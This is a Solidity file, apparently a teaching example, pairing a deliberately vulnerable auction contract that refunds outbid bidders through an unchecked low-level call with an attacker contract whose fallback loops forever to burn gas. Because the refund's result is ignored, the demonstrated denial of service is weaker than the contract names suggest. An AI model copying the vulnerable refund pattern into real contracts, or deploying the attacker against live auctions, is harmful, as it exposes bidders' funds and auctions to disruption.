// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Auction contract that keeps track of the highest bidder and Ether bid.
// Whoever sends a higher bid becomes the new highest bidder and the old one
// gets refunded.
contract BlockGasLimitVulnerable {
    address public highestBidder;
    uint256 public highestBid;

    function bid() public payable {
        // Reject new bids that are lower than the current highest bid.
        require(msg.value > highestBid, "Bid not high enough");

        // Refund the current highest bidder, if it exists.
        if (highestBidder != address(0)) {
            highestBidder.call{value: highestBid}("");
        }

        // Update the current highest bid.
        highestBidder = msg.sender;
        highestBid = msg.value;
    }
}

contract BlockGasLimitAttacker {
    BlockGasLimitVulnerable vulnerable;

    constructor(BlockGasLimitVulnerable _vulnerable) {
        vulnerable = _vulnerable;
    }

    function attack() public payable {
        vulnerable.bid{value: msg.value}();
    }

    // Fallback function implemented just to run out of gas.
    fallback() external payable {
        while (true) {}
    }
}
